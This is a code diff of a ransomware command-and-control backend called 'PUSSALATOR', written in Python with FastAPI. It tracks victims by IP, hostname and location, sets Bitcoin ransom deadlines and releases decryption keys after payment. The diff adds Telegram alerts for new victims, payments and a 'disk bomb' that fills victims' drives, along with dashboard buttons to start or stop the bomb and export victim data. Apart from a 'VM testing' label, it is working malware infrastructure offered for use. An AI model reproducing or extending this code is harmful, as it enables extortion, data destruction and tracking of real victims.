@@ -1,37 +1,51 @@
+#!/usr/bin/env python3
+"""
+PUSSALATOR - Complete Backend with Telegram Bot
+FOR VM TESTING ONLY
+"""
+
 import os
+import sys
 import json
 import random
 import string
 import hashlib
 import sqlite3
+import threading
+import time
 from datetime import datetime, timedelta
 from contextlib import asynccontextmanager
 from typing import Optional, Dict, Any, List
 
 # FastAPI imports
-from fastapi import FastAPI, Request, Response, HTTPException, Depends
+from fastapi import FastAPI, Request, Response, HTTPException, Depends, BackgroundTasks
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 from fastapi.middleware.cors import CORSMiddleware
 import uvicorn
 
 # Third party imports
 from pydantic import BaseModel
+import requests
 
 # ============================================================================
 # CONFIGURATION
 # ============================================================================
 
 class Config:
-    SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-key-change-this')
+    SECRET_KEY = os.environ.get('SECRET_KEY',)
     
     # Ransom settings
     DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT', '0.5 BTC')
-    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS')
+    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS',)
     DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS', 72))
     
     # Owner credentials
-    OWNER_ID = os.environ.get('OWNER_ID')
-    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
+    OWNER_ID = os.environ.get('OWNER_ID',)
+    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD',)
+    
+    # Telegram Bot
+    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
+    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     
     # Server settings
     DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
@@ -39,7 +53,7 @@ class Config:
     PORT = int(os.environ.get('PORT', 8000))
     
     # Database
-    DATABASE = 'pussalator.db'
+    DATABASE = 'pussalator3.db'
 
 # ============================================================================
 # DATABASE SETUP
@@ -152,6 +166,120 @@ def db_update(table, data, where, where_params):
     db_execute(query, values)
 
 # ============================================================================
+# TELEGRAM BOT
+# ============================================================================
+
+class TelegramBot:
+    """Telegram bot for notifications"""
+    
+    def __init__(self):
+        self.token = Config.TELEGRAM_BOT_TOKEN
+        self.chat_id = Config.TELEGRAM_CHAT_ID
+        self.enabled = bool(self.token and self.chat_id)
+        
+        if self.enabled:
+            print(f"[+] Telegram bot enabled - chat ID: {self.chat_id}")
+        else:
+            print("[-] Telegram bot disabled - set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
+    
+    def send(self, message: str) -> bool:
+        """Send message to Telegram"""
+        if not self.enabled:
+            return False
+        
+        try:
+            # Format message with HTML
+            formatted_msg = f"<b>🔴 PUSSALATOR ALERT</b>\n\n{message}\n\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            
+            response = requests.post(
+                f"https://api.telegram.org/bot{self.token}/sendMessage",
+                json={
+                    'chat_id': self.chat_id,
+                    'text': formatted_msg,
+                    'parse_mode': 'HTML'
+                },
+                timeout=5
+            )
+            
+            if response.status_code == 200:
+                print(f"[+] Telegram sent: {message[:50]}...")
+                return True
+            else:
+                print(f"[-] Telegram error: {response.status_code}")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Telegram exception: {e}")
+            return False
+    
+    def notify_new_victim(self, victim_id: str, location: str, ip: str, hostname: str):
+        """Send notification about new victim"""
+        msg = f"""<b>🔥 NEW VICTIM REGISTERED</b>
+
+<b>ID:</b> <code>{victim_id}</code>
+<b>Hostname:</b> {hostname}
+<b>Location:</b> {location}
+<b>IP:</b> {ip}"""
+        self.send(msg)
+    
+    def notify_payment(self, victim_id: str, amount: str, tx_id: str):
+        """Send notification about payment"""
+        msg = f"""<b>💰 PAYMENT RECEIVED</b>
+
+<b>ID:</b> <code>{victim_id}</code>
+<b>Amount:</b> {amount}
+<b>Transaction:</b> <code>{tx_id}</code>
+
+<b>🎉 The demon is pleased!</b>"""
+        self.send(msg)
+    
+    def notify_bomb_start(self, victim_id: str):
+        """Send notification about bomb start"""
+        msg = f"""<b>💣 DISK BOMB ACTIVATED</b>
+
+<b>ID:</b> <code>{victim_id}</code>
+
+<b>Their hard drive is being consumed by hellfire!</b>"""
+        self.send(msg)
+    
+    def notify_bomb_progress(self, victim_id: str, size_gb: float):
+        """Send notification about bomb progress"""
+        msg = f"""<b>💣 BOMB PROGRESS</b>
+
+<b>ID:</b> <code>{victim_id}</code>
+<b>Size:</b> {size_gb:.2f} GB
+
+<b>The demon grows stronger...</b>"""
+        self.send(msg)
+    
+    def notify_bomb_stop(self, victim_id: str):
+        """Send notification about bomb stop"""
+        msg = f"""<b>⛓️ BOMB STOPPED</b>
+
+<b>ID:</b> <code>{victim_id}</code>
+
+<b>The demon rests... for now.</b>"""
+        self.send(msg)
+    
+    def notify_status_update(self, victim_id: str, status: str, files: int):
+        """Send notification about status update"""
+        status_emoji = {
+            'paid': '✅',
+            'unpaid': '⏳',
+            'expired': '💀'
+        }.get(status, '❓')
+        
+        msg = f"""<b>{status_emoji} STATUS UPDATE</b>
+
+<b>ID:</b> <code>{victim_id}</code>
+<b>Status:</b> {status.upper()}
+<b>Files Encrypted:</b> {files}"""
+        self.send(msg)
+
+# Initialize Telegram bot
+telegram = TelegramBot()
+
+# ============================================================================
 # PYDANTIC MODELS
 # ============================================================================
 
@@ -248,6 +376,33 @@ def get_stats() -> Dict[str, Any]:
             'total_files': 0, 'active_bombs': 0, 'paid_today': 0
         }
 
+def check_expired_victims():
+    """Background task to check for expired victims"""
+    while True:
+        try:
+            victims = db_execute("SELECT * FROM victims WHERE status='unpaid'")
+            now = datetime.utcnow()
+            
+            for victim in victims:
+                if victim.get('deadline'):
+                    deadline = datetime.fromisoformat(victim['deadline'])
+                    if now > deadline:
+                        db_update('victims', {'status': 'expired'}, 'id = ?', [victim['id']])
+                        print(f"[+] Victim {victim['id']} expired")
+                        
+                        # Send Telegram notification
+                        telegram.notify_status_update(victim['id'], 'expired', victim['files'])
+            
+            time.sleep(60)  # Check every minute
+            
+        except Exception as e:
+            print(f"Expiry check error: {e}")
+            time.sleep(60)
+
+# Start expiry checker thread
+expiry_thread = threading.Thread(target=check_expired_victims, daemon=True)
+expiry_thread.start()
+
 # ============================================================================
 # FASTAPI APP INIT
 # ============================================================================
@@ -256,16 +411,24 @@ def get_stats() -> Dict[str, Any]:
 async def lifespan(app: FastAPI):
     # Startup
     print("=" * 60)
-    print("PUSSALATOR - FIXED BACKEND")
+    print("PUSSALATOR - COMPLETE BACKEND WITH TELEGRAM")
     print("=" * 60)
     print(f"Server: http://{Config.HOST}:{Config.PORT}")
     print(f"Owner ID: {Config.OWNER_ID}")
+    print(f"Telegram: {'✅ ENABLED' if telegram.enabled else '❌ DISABLED'}")
     print("=" * 60)
     print("WARNING: For VM testing only!")
     print("=" * 60)
     
+    # Send startup notification
+    if telegram.enabled:
+        telegram.send("<b>🚀 PUSSALATOR BACKEND STARTED</b>\n\nThe demon awakens...")
+    
     yield
     
+    # Shutdown
+    if telegram.enabled:
+        telegram.send("<b>💤 PUSSALATOR BACKEND SHUTDOWN</b>\n\nThe demon sleeps...")
     print("[+] Shutting down...")
 
 app = FastAPI(
@@ -861,6 +1024,30 @@ OWNER_DASHBOARD_TEMPLATE = """
             font-size: 12px;
             color: #ff9999;
         }
+        .filters {
+            background: #1a0000;
+            padding: 15px;
+            border: 1px solid #ff0000;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .filters input, .filters select {
+            background: black;
+            border: 1px solid #ff0000;
+            color: #00ff00;
+            padding: 8px 12px;
+            font-family: 'Courier New', monospace;
+        }
+        .filters button {
+            background: #ff0000;
+            color: black;
+            border: none;
+            padding: 8px 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
         .table-container {
             overflow-x: auto;
             background: #1a0000;
@@ -938,6 +1125,15 @@ OWNER_DASHBOARD_TEMPLATE = """
             cursor: pointer;
             float: right;
         }
+        .telegram-status {
+            background: #1a1a1a;
+            border: 1px solid #ff0000;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 12px;
+        }
+        .telegram-enabled { color: #00ff00; }
+        .telegram-disabled { color: #ff0000; }
     </style>
 </head>
 <body>
@@ -945,8 +1141,13 @@ OWNER_DASHBOARD_TEMPLATE = """
         <h1>⚙️ OWNER DASHBOARD</h1>
         <div class="nav-links">
             <button onclick="loadData()">🔄 REFRESH</button>
+            <button onclick="testTelegram()">📱 TEST TELEGRAM</button>
             <button onclick="logout()">🚪 LOGOUT</button>
         </div>
+    </div>
+    
+    <div class="telegram-status" id="telegramStatus">
+        Loading Telegram status...
     </div>
     
     <div class="stats-grid" id="statsGrid">
@@ -956,6 +1157,22 @@ OWNER_DASHBOARD_TEMPLATE = """
         <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div class="stat-label">EXPIRED</div></div>
         <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div class="stat-label">FILES</div></div>
         <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div class="stat-label">BOMBS</div></div>
+    </div>
+    
+    <div class="filters">
+        <input type="text" id="searchInput" placeholder="Search ID, IP, hostname..." onkeyup="filterTable()">
+        <select id="statusFilter" onchange="filterTable()">
+            <option value="all">ALL STATUS</option>
+            <option value="paid">PAID</option>
+            <option value="unpaid">UNPAID</option>
+            <option value="expired">EXPIRED</option>
+        </select>
+        <select id="bombFilter" onchange="filterTable()">
+            <option value="all">ALL BOMBS</option>
+            <option value="active">ACTIVE</option>
+            <option value="inactive">INACTIVE</option>
+        </select>
+        <button onclick="exportData()">📥 EXPORT CSV</button>
     </div>
     
     <div class="table-container">
@@ -987,7 +1204,10 @@ OWNER_DASHBOARD_TEMPLATE = """
             <div id="victimDetails"></div>
             <div style="margin-top:20px;">
                 <button class="action-btn" onclick="markPaid()">💰 MARK PAID</button>
+                <button class="action-btn" onclick="startBomb()">💣 START BOMB</button>
+                <button class="action-btn" onclick="stopBomb()">🛑 STOP BOMB</button>
                 <button class="action-btn" onclick="deleteVictim()">❌ DELETE</button>
+                <button class="action-btn" onclick="notifyTelegram()">📱 NOTIFY</button>
             </div>
         </div>
     </div>
@@ -997,8 +1217,38 @@ OWNER_DASHBOARD_TEMPLATE = """
         let victims = [];
         
         async function loadData() {
+            await loadTelegramStatus();
             await loadStats();
             await loadVictims();
+        }
+        
+        async function loadTelegramStatus() {
+            try {
+                const response = await fetch('/api/telegram/status');
+                const data = await response.json();
+                const statusDiv = document.getElementById('telegramStatus');
+                if (data.enabled) {
+                    statusDiv.innerHTML = `📱 <span class="telegram-enabled">TELEGRAM BOT ENABLED</span> - Chat ID: ${data.chat_id}`;
+                } else {
+                    statusDiv.innerHTML = `📱 <span class="telegram-disabled">TELEGRAM BOT DISABLED</span> - Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID`;
+                }
+            } catch(e) {
+                console.error('Telegram status error:', e);
+            }
+        }
+        
+        async function testTelegram() {
+            try {
+                const response = await fetch('/api/telegram/test', { method: 'POST' });
+                const data = await response.json();
+                if (data.success) {
+                    alert('✅ Test message sent to Telegram!');
+                } else {
+                    alert('❌ Failed to send test message. Check bot token and chat ID.');
+                }
+            } catch(e) {
+                alert('Error testing Telegram');
+            }
         }
         
         async function loadStats() {
@@ -1027,13 +1277,31 @@ OWNER_DASHBOARD_TEMPLATE = """
         }
         
         function renderTable() {
-            if (!victims.length) {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            const statusFilter = document.getElementById('statusFilter').value;
+            const bombFilter = document.getElementById('bombFilter').value;
+            
+            let filtered = victims.filter(v => {
+                const matchesSearch = searchTerm === '' || 
+                    (v.id && v.id.toLowerCase().includes(searchTerm)) ||
+                    (v.hostname && v.hostname.toLowerCase().includes(searchTerm)) ||
+                    (v.ip && v.ip.includes(searchTerm));
+                
+                const matchesStatus = statusFilter === 'all' || v.status === statusFilter;
+                const matchesBomb = bombFilter === 'all' || 
+                    (bombFilter === 'active' && v.bomb_status === 'active') ||
+                    (bombFilter === 'inactive' && v.bomb_status !== 'active');
+                
+                return matchesSearch && matchesStatus && matchesBomb;
+            });
+            
+            if (!filtered.length) {
                 document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;">No victims found</td></tr>';
                 return;
             }
             
             let html = '';
-            victims.forEach(v => {
+            filtered.forEach(v => {
                 const bombIcon = v.bomb_status === 'active' ? '💣 ACTIVE' : '⚫';
                 const bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
                 
@@ -1051,6 +1319,10 @@ OWNER_DASHBOARD_TEMPLATE = """
             });
             
             document.getElementById('tableBody').innerHTML = html;
+        }
+        
+        function filterTable() {
+            renderTable();
         }
         
         async function viewVictim(victimId) {
@@ -1084,12 +1356,53 @@ OWNER_DASHBOARD_TEMPLATE = """
                 });
                 
                 if (response.ok) {
-                    alert('Marked as paid!');
+                    alert('✅ Marked as paid! Telegram notification sent.');
+                    closeModal();
+                    loadVictims();
+                    loadStats();
+                }
+            } catch(e) {
+                alert('Error marking as paid');
+            }
+        }
+        
+        async function startBomb() {
+            if (!currentVictim) return;
+            
+            try {
+                const response = await fetch('/api/owner/bomb/start', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({victim_id: currentVictim.id})
+                });
+                
+                if (response.ok) {
+                    alert('💣 Bomb started! Telegram notification sent.');
                     closeModal();
                     loadVictims();
                 }
             } catch(e) {
-                alert('Error marking as paid');
+                alert('Error starting bomb');
+            }
+        }
+        
+        async function stopBomb() {
+            if (!currentVictim) return;
+            
+            try {
+                const response = await fetch('/api/owner/bomb/stop', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({victim_id: currentVictim.id})
+                });
+                
+                if (response.ok) {
+                    alert('⛓️ Bomb stopped! Telegram notification sent.');
+                    closeModal();
+                    loadVictims();
+                }
+            } catch(e) {
+                alert('Error stopping bomb');
             }
         }
         
@@ -1113,8 +1426,44 @@ OWNER_DASHBOARD_TEMPLATE = """
             }
         }
         
+        async function notifyTelegram() {
+            if (!currentVictim) return;
+            
+            try {
+                const response = await fetch('/api/telegram/notify', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        victim_id: currentVictim.id,
+                        message: `Manual notification from admin`
+                    })
+                });
+                
+                if (response.ok) {
+                    alert('📱 Telegram notification sent!');
+                } else {
+                    alert('❌ Failed to send Telegram notification');
+                }
+            } catch(e) {
+                alert('Error sending notification');
+            }
+        }
+        
+        function exportData() {
+            let csv = 'Victim ID,Status,Hostname,IP,Country,City,Files,Ransom,Bomb Status\n';
+            victims.forEach(v => {
+                csv += `"${v.id}",${v.status},"${v.hostname}",${v.ip},"${v.country}","${v.city}",${v.files},"${v.ransom}",${v.bomb_status}\n`;
+            });
+            
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `victims_${new Date().toISOString().slice(0,10)}.csv`;
+            a.click();
+        }
+        
         async function logout() {
-            await fetch('/api/owner/logout', { method: 'POST' });
             window.location.href = '/';
         }
         
@@ -1163,7 +1512,7 @@ async def api_get_victim(victim_id: str):
         if not victim:
             raise HTTPException(status_code=404, detail="Victim not found")
         
-        # Check deadline
+        # Check deadline (already handled by background thread, but double-check)
         if victim['status'] == 'unpaid' and victim.get('deadline'):
             deadline = datetime.fromisoformat(victim['deadline'])
             if datetime.utcnow() > deadline:
@@ -1183,7 +1532,7 @@ async def api_get_victim(victim_id: str):
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/add-victim")
-async def api_add_victim(victim_data: VictimRegister):
+async def api_add_victim(victim_data: VictimRegister, background_tasks: BackgroundTasks):
     """Register new victim (called by client)"""
     try:
         victim_id = victim_data.victim_id or generate_victim_id()
@@ -1230,6 +1579,16 @@ async def api_add_victim(victim_data: VictimRegister):
         
         print(f"[+] New victim registered: {victim_id}")
         
+        # Send Telegram notification
+        location = f"{victim_data.city}, {victim_data.country}" if victim_data.city != 'Unknown' else victim_data.country
+        background_tasks.add_task(
+            telegram.notify_new_victim,
+            victim_id,
+            location,
+            victim_data.ip,
+            victim_data.hostname
+        )
+        
         # Prepare response
         response = {
             'victim_id': victim_id,
@@ -1267,7 +1626,7 @@ async def api_update_victim(update_data: VictimUpdate):
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/verify-payment")
-async def api_verify_payment(payment_data: PaymentVerify):
+async def api_verify_payment(payment_data: PaymentVerify, background_tasks: BackgroundTasks):
     """Verify payment from client"""
     try:
         # Update victim
@@ -1277,13 +1636,21 @@ async def api_verify_payment(payment_data: PaymentVerify):
             'tx': payment_data.tx_id
         }, 'id = ?', [payment_data.victim_id])
         
-        # Get key
-        victim = db_get_one('SELECT key FROM victims WHERE id = ?', (payment_data.victim_id,))
-        key = victim['key'] if victim else None
+        # Get victim details for notification
+        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (payment_data.victim_id,))
         
         log_action('payment', f'Payment for {payment_data.victim_id}: {payment_data.tx_id}')
         
-        return {'success': True, 'key': key}
+        # Send Telegram notification
+        if victim:
+            background_tasks.add_task(
+                telegram.notify_payment,
+                payment_data.victim_id,
+                victim.get('ransom', '0.5 BTC'),
+                payment_data.tx_id
+            )
+        
+        return {'success': True, 'key': victim['key'] if victim else None}
         
     except Exception as e:
         print(f"Error verifying payment: {e}")
@@ -1304,15 +1671,26 @@ async def api_get_bomb_command(victim_id: str):
     return {'action': 'none'}
 
 @app.post("/api/bomb/update")
-async def api_bomb_update(bomb_data: BombUpdate):
+async def api_bomb_update(bomb_data: BombUpdate, background_tasks: BackgroundTasks):
     """Update bomb status"""
     try:
         update_dict = {}
         
         if bomb_data.error:
             update_dict['bomb_status'] = 'error'
+            background_tasks.add_task(telegram.notify_bomb_stop, bomb_data.client_id)
         else:
             update_dict['bomb_size'] = bomb_data.size_gb
+            
+            # Check if just started
+            victim = db_get_one('SELECT bomb_status FROM victims WHERE id = ?', (bomb_data.client_id,))
+            if victim and victim.get('bomb_status') != 'active' and bomb_data.size_gb > 0:
+                update_dict['bomb_status'] = 'active'
+                background_tasks.add_task(telegram.notify_bomb_start, bomb_data.client_id)
+            
+            # Progress notifications every 10GB
+            if int(bomb_data.size_gb) % 10 == 0 and bomb_data.size_gb > 0:
+                background_tasks.add_task(telegram.notify_bomb_progress, bomb_data.client_id, bomb_data.size_gb)
         
         db_update('victims', update_dict, 'id = ?', [bomb_data.client_id])
         
@@ -1321,6 +1699,40 @@ async def api_bomb_update(bomb_data: BombUpdate):
     except Exception as e:
         print(f"Error updating bomb: {e}")
         raise HTTPException(status_code=500, detail=str(e))
+
+# ============================================================================
+# ROUTES - API (Telegram)
+# ============================================================================
+
+@app.get("/api/telegram/status")
+async def api_telegram_status():
+    """Get Telegram bot status"""
+    return {
+        'enabled': telegram.enabled,
+        'chat_id': telegram.chat_id if telegram.enabled else None
+    }
+
+@app.post("/api/telegram/test")
+async def api_telegram_test():
+    """Test Telegram bot"""
+    if not telegram.enabled:
+        raise HTTPException(status_code=400, detail="Telegram not configured")
+    
+    success = telegram.send("<b>🧪 TEST MESSAGE</b>\n\nThe demon is watching...")
+    return {'success': success}
+
+@app.post("/api/telegram/notify")
+async def api_telegram_notify(request: Request):
+    """Send manual Telegram notification"""
+    if not telegram.enabled:
+        raise HTTPException(status_code=400, detail="Telegram not configured")
+    
+    data = await request.json()
+    victim_id = data.get('victim_id')
+    message = data.get('message', 'Manual notification')
+    
+    success = telegram.send(f"<b>📋 ADMIN NOTIFICATION</b>\n\n<b>Victim:</b> {victim_id}\n<b>Message:</b> {message}")
+    return {'success': success}
 
 # ============================================================================
 # ROUTES - API (Owner Only)
@@ -1365,15 +1777,64 @@ async def api_owner_victim(victim_id: str):
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/owner/mark-paid/{victim_id}")
-async def api_owner_mark_paid(victim_id: str):
+async def api_owner_mark_paid(victim_id: str, background_tasks: BackgroundTasks):
     """Mark victim as paid"""
     try:
+        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (victim_id,))
+        if not victim:
+            raise HTTPException(status_code=404, detail="Victim not found")
+        
         db_update('victims', {
             'status': 'paid',
             'paid_at': datetime.utcnow().isoformat()
         }, 'id = ?', [victim_id])
         
         log_action('mark_paid', f'Marked {victim_id} as paid')
+        
+        # Send Telegram notification
+        background_tasks.add_task(
+            telegram.notify_payment,
+            victim_id,
+            victim.get('ransom', '0.5 BTC'),
+            'manual_verification'
+        )
+        
+        return {'success': True}
+        
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/owner/bomb/start")
+async def api_owner_bomb_start(bomb_data: BombControl, background_tasks: BackgroundTasks):
+    """Start bomb on victim"""
+    try:
+        db_update('victims', {
+            'bomb_status': 'active',
+            'bomb_size': 0
+        }, 'id = ?', [bomb_data.victim_id])
+        
+        log_action('bomb_start', f'Started bomb on {bomb_data.victim_id}')
+        
+        # Send Telegram notification
+        background_tasks.add_task(telegram.notify_bomb_start, bomb_data.victim_id)
+        
+        return {'success': True}
+        
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/owner/bomb/stop")
+async def api_owner_bomb_stop(bomb_data: BombControl, background_tasks: BackgroundTasks):
+    """Stop bomb on victim"""
+    try:
+        db_update('victims', {
+            'bomb_status': 'stopped'
+        }, 'id = ?', [bomb_data.victim_id])
+        
+        log_action('bomb_stop', f'Stopped bomb on {bomb_data.victim_id}')
+        
+        # Send Telegram notification
+        background_tasks.add_task(telegram.notify_bomb_stop, bomb_data.victim_id)
         
         return {'success': True}
         
@@ -1387,6 +1848,15 @@ async def api_owner_delete_victim(victim_id: str):
         db_execute('DELETE FROM victims WHERE id = ?', (victim_id,))
         log_action('delete_victim', f'Deleted {victim_id}')
         return {'success': True}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.get("/api/owner/logs")
+async def api_owner_logs():
+    """Get logs"""
+    try:
+        logs = db_execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 100')
+        return logs
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
